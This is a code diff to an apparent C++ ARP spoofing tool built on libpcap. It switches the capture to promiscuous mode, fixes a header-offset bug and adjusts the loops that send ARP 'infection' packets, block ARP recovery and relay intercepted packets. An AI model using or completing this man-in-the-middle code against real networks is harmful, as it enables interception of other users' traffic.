@@ -7,6 +7,8 @@
 #include "printdata.h"
 #include <signal.h>
 #include <future>
+#include <glog/logging.h>
+#include <gflags/gflags.h>
 
 using namespace std;
 
@@ -20,13 +22,13 @@ void getSenderMAC(pcap_t *pcd,Param* param,int sessionNum);
 void getTargetMAC(pcap_t *pcd,Param* param,int sessionNum);
 void sendARPReguest(Param param,uint32_t*findIP,int print,pcap_t *pcd);
 void sendInfectionPacket(pcap_t* pcd,Param param);
-void callSendInfectionPacket(pcap_t* pcd, Param *param, int sessionNum, bool threadHanlder);
+void callSendInfectionPacket(pcap_t* pcd, Param *param, int sessionNum);
 void signalFunction(int sig);
 void modifySignalHandler(bool* signalHandler);
 void relayAntiRecover(pcap_t* pcd, Param *param, int sessionNum);
 void sendRelayPacket(pcap_t* pcd, int len, u_int8_t* mSrcMAC, u_int8_t* mDestMAC,const u_char* originPacket);
 
-bool threadHandler=true;
+bool pHandler=true;
 
 struct ARPPacket{
     struct ether_header eh;
@@ -36,6 +38,9 @@ struct ARPPacket{
 
 int main(int argc, char *argv[])
 {
+    google::InitGoogleLogging(argv[0]); //need to add -lglog
+    FLAGS_alsologtostderr=1;           //log print to console
+
     ProtoParam protoParam(argc,argv); //check arg & init sessionNum
 
     char errBuf[PCAP_ERRBUF_SIZE];
@@ -48,7 +53,7 @@ int main(int argc, char *argv[])
     initClass(param,device,protoParam.sessionNum);
     /*init pcd*/
     pcap_t *pcd;
-    if((pcd = pcap_open_live(device,BUFSIZ,NONPROMISCUOUS,1,errBuf))==NULL)
+    if((pcd = pcap_open_live(device,BUFSIZ,PROMISCUOUS,1,errBuf))==NULL)
     {
         perror(errBuf);
         exit(1);
@@ -68,9 +73,8 @@ int main(int argc, char *argv[])
 
     Param threadparam[protoParam.sessionNum];
 
-    memcpy(threadparam,param,sizeof(threadparam));
-    //&* ????
-    thread t1(callSendInfectionPacket,pcd,&*threadparam,protoParam.sessionNum,threadHandler);
+    memcpy(threadparam,param,sizeof(threadparam));\
+    thread t1(callSendInfectionPacket,pcd,&*threadparam,protoParam.sessionNum);
 
     relayAntiRecover(pcd,param,protoParam.sessionNum);
 
@@ -235,11 +239,11 @@ void sendInfectionPacket(pcap_t* pcd,Param param)
 
 }
 
-void callSendInfectionPacket(pcap_t *pcd, Param* param, int sessionNum, bool threadHanlder)
+void callSendInfectionPacket(pcap_t *pcd, Param* param, int sessionNum)
 {
 
 
-    while(threadHanlder)
+    while(pHandler)
     {
         for (int i = 0; i < sessionNum; ++i) {
             sendInfectionPacket(pcd,param[i]);
@@ -247,14 +251,14 @@ void callSendInfectionPacket(pcap_t *pcd, Param* param, int sessionNum, bool thr
         }
         sleep(3);
     }
-    cout<<"sendInfectionPacket thread killed"<<endl;
+    DLOG(INFO)<<"sendInfectionPacket thread killed"<<endl;
 }
 
 void signalFunction(int sig)
 {
     (void)sig;
-    threadHandler=false;
-    cout<<"signal Function called"<<endl;
+    pHandler=false;
+    DLOG(INFO)<<"signal Function called"<<endl;
     signal(SIGINT,SIG_DFL);
 }
 
@@ -264,7 +268,7 @@ void relayAntiRecover(pcap_t *pcd, Param *param,int sessionNum)
     struct pcap_pkthdr *pktHeader;
     int valueOfNextEx;
 
-    while(true)
+    while(pHandler)
     {
 
         //need a thread
@@ -276,8 +280,9 @@ void relayAntiRecover(pcap_t *pcd, Param *param,int sessionNum)
                 {
                     //do anti recover
                     struct ether_header *ep =(struct ether_header*)pkt_data;
+                    u_int16_t ether_type =ntohs(ep->ether_type);
 
-                    if(ntohs(ep->ether_type)==ETHERTYPE_ARP) //next packet ARP
+                    if(ether_type==ETHERTYPE_ARP) //next packet ARP
                     {
                         struct ARPPacket* ARPRecover=(struct ARPPacket *)pkt_data;
                         for (int i = 0; i < sessionNum; i++)
@@ -300,15 +305,16 @@ void relayAntiRecover(pcap_t *pcd, Param *param,int sessionNum)
 
                     //do relay
 
-                    if(ntohs(ep->ether_type)==ETHERTYPE_IP)
+                    if(ether_type==ETHERTYPE_IP)
                     {
-                        struct iphdr *iph=(struct iphdr*)(sizeof(ep)+pkt_data);
+                        struct iphdr *iph=(struct iphdr*)(pkt_data+sizeof(struct ether_header));
+
                         for (int i = 0; i < sessionNum; i++)
                         {
                             if(param[i].sender_Mac==ep->ether_shost) //if src MAC is senderMAC
                                 if(param[i].my_Mac==ep->ether_dhost) //if dest MAC is myMAC
-                                    if(!(param[i].my_Ip==&iph->daddr))//if dest IP address not mine
-                                        sendRelayPacket(pcd,pktHeader->len,param[i].my_Mac.retnMac(),param[i].target_Mac.retnMac(),pkt_data); //change src mac addr to target mac & send
+                                     if(param[i].sender_Ip==&iph->saddr)//if src IP address Sender
+                                         sendRelayPacket(pcd,pktHeader->len,param[i].my_Mac.retnMac(),param[i].target_Mac.retnMac(),pkt_data); //change src mac addr to target mac & send
 
 
                         }
